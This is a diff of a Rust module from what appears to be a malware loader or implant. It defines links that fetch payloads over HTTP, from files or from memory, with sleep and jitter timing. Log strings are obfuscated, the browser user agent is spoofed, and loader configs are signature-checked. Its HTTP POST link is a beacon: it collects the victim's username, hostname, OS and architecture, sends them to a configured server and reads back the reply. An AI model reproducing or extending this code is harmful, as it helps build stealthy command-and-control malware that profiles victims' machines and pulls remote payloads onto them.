@@ -1,27 +1,25 @@
 use crate::dataoperation::{DataOperation, UnApplyDataOperation};
 use crate::poollink::Advanced;
-use rand::Rng;
-use serde::{Deserialize, Serialize};
-use std::io::Read;
-use std::{thread, time};
 use anyhow::bail;
 use anyhow::Result;
 use cryptify::encrypt_string;
 use log::debug;
 use log::info;
+use rand::Rng;
+use serde::{Deserialize, Serialize};
+use std::io::Read;
+use std::{thread, time};
 
 use crate::config::Config;
 
-use std::time::Duration;
-use std::fs;
 use std::collections::HashMap;
+use std::fs;
+use std::time::Duration;
 
 //TODO remove this from const, and find a way to define it globally with config for every Link.
 const USER_AGENT: &str =
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0";
 const TIMEOUT: u64 = 10;
-
-
 
 #[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
 pub enum Link {
@@ -30,7 +28,6 @@ pub enum Link {
     FILE(FileLink),
     MEMORY(MemoryLink),
     HTTPost(HTTPPostLink),
-
 }
 impl Link {
     pub fn print_link_compact(&self) {
@@ -67,8 +64,7 @@ impl Link {
         };
         match config.verify_newloader_sign(&newconfig) {
             Ok(()) => (),
-            _unspecified =>
-            {
+            _unspecified => {
                 bail!(
                     "{}{}{}",
                     encrypt_string!("link "),
@@ -136,9 +132,6 @@ pub struct HTTPPostLink {
     pub sleep: u64,
     pub jitt: u64,
 }
-
-
-
 
 pub trait LinkFetch {
     fn download_data(&self) -> Result<Vec<u8>, anyhow::Error>;
@@ -223,10 +216,8 @@ impl LinkFetch for Link {
     }
 }
 
-
 impl LinkFetch for FileLink {
     fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
-        //TODO: en fonction du type de Link, on va appeller une fonction differente HTTP ou DNS ou ...
         debug!("{}{}", encrypt_string!("File Open: "), &self.get_target());
         let file_bytes: Vec<u8> = fs::read(self.get_target())?;
         Ok(file_bytes)
@@ -327,42 +318,6 @@ impl LinkFetch for MemoryLink {
     }
 }
 
-
-
-
-
-impl LinkFetch for HTTPLink {
-    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
-        let client = reqwest::blocking::Client::builder()
-            .timeout(Duration::from_secs(TIMEOUT))
-            .user_agent(USER_AGENT)
-            .build()?;
-
-        let mut res = client.get(&self.get_target()).send()?;
-        let mut body: Vec<u8> = Vec::new();
-        res.read_to_end(&mut body)?;
-
-        //debug!("{}{}", encrypt_string!("Download status: "), res.status());
-        //debug!("   -Headers: {:#?}", res.headers());
-        //debug!("{}{}", encrypt_string!("Download len: "), &body.len());
-        //debug!("{}{:?}", encrypt_string!("Download bytes: "), &body[1..15]);
-        Ok(body)
-    }
-
-    fn get_target(&self) -> String {
-        format!("{}", self.url)
-    }
-    fn get_dataoperation(&self) -> Vec<DataOperation> {
-        self.dataoperation.to_vec()
-    }
-    fn get_sleep(&self) -> u64 {
-        self.sleep
-    }
-    fn get_jitt(&self) -> u64 {
-        self.jitt
-    }
-}
-
 impl LinkFetch for DNSLink {
     fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
@@ -382,60 +337,17 @@ impl LinkFetch for DNSLink {
     }
 }
 
-        //TODO, remove get_target function
-
-// ----------- Post DAta
-impl LinkFetch for HTTPPostLink {
+impl LinkFetch for HTTPLink {
     fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
-        let mut map: HashMap<&str, String> = HashMap::new();
-
-        let id = uuid::Uuid::new_v4();
-        map.insert("session_id", id.to_string() );
-        map.insert("loader", "todo".to_string());
-        map.insert("username", whoami::username() );
-        map.insert("distro",whoami::distro());
-        map.insert("desktop_env",whoami::desktop_env().to_string());
-        map.insert("arch",whoami::arch().to_string());
-        map.insert("hostname",whoami::devicename());
-        //TODO
-        //map.insert("domain",domain_name());
-        map.insert("config","".to_string());
-        map.insert("running-thread","".to_string());
-        map.insert("working-link","".to_string());
-        //map.insert("lang",whoami::distro());
-        
-        // Create a new client object
-        //let client = reqwest::blocking::Client::new();
         let client = reqwest::blocking::Client::builder()
-        .timeout(Duration::from_secs(TIMEOUT))
-        .user_agent(USER_AGENT)
-        .build()?;
+            .timeout(Duration::from_secs(TIMEOUT))
+            .user_agent(USER_AGENT)
+            .build()?;
 
-        let mut res = client.post(&self.get_target()).json(&map).send()?;
+        let mut res = client.get(&self.get_target()).send()?;
         let mut body: Vec<u8> = Vec::new();
         res.read_to_end(&mut body)?;
-
-        //debug!("{}{}", encrypt_string!("Download status: "), res.status());
-        //debug!("   -Headers: {:#?}", res.headers());
-        //debug!("{}{}", encrypt_string!("Download len: "), &body.len());
-        //debug!("{}{:?}", encrypt_string!("Download bytes: "), &body[1..15]);
         Ok(body)
-
-
-        /* 
-        let resp = match client.post( &self.url)  
-        .json(&map)
-        .send() {
-            Ok(resp) => resp.text().unwrap(),
-            Err(err) => panic!("Error: {}", err)
-        };
-    
-        println!("Response: {}", resp);
-
-        */
-    
-        //todo!();
-
     }
 
     fn get_target(&self) -> String {
@@ -452,13 +364,49 @@ impl LinkFetch for HTTPPostLink {
     }
 }
 
+impl LinkFetch for HTTPPostLink {
+    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
+        let mut map: HashMap<&str, String> = HashMap::new();
 
+        let id = uuid::Uuid::new_v4();
+        map.insert("username", whoami::username());
+        map.insert("distro", whoami::distro());
+        map.insert("desktop_env", whoami::desktop_env().to_string());
+        map.insert("arch", whoami::arch().to_string());
+        map.insert("hostname", whoami::devicename());
+        //TODO send real data
+        map.insert("loader", "todo".to_string());
+        map.insert("session_id", id.to_string());
+        map.insert("config", "".to_string());
+        map.insert("running-thread", "".to_string());
+        map.insert("working-link", "".to_string());
+        //TODO
+        //map.insert("lang",whoami::distro());
+        //map.insert("domain",domain_name());
 
-        // TODO remove hostname depency
-        /* 
-        let hostname = gethostname()
-                .to_ascii_uppercase()
-                .to_os_string()
-                .into_string()
-                .unwrap();
-        map.insert("hostname", hostname );*/
+        // Create a new client object
+        //let client = reqwest::blocking::Client::new();
+        let client = reqwest::blocking::Client::builder()
+            .timeout(Duration::from_secs(TIMEOUT))
+            .user_agent(USER_AGENT)
+            .build()?;
+
+        let mut res = client.post(&self.get_target()).json(&map).send()?;
+        let mut body: Vec<u8> = Vec::new();
+        res.read_to_end(&mut body)?;
+        Ok(body)
+    }
+
+    fn get_target(&self) -> String {
+        format!("{}", self.url)
+    }
+    fn get_dataoperation(&self) -> Vec<DataOperation> {
+        self.dataoperation.to_vec()
+    }
+    fn get_sleep(&self) -> u64 {
+        self.sleep
+    }
+    fn get_jitt(&self) -> u64 {
+        self.jitt
+    }
+}
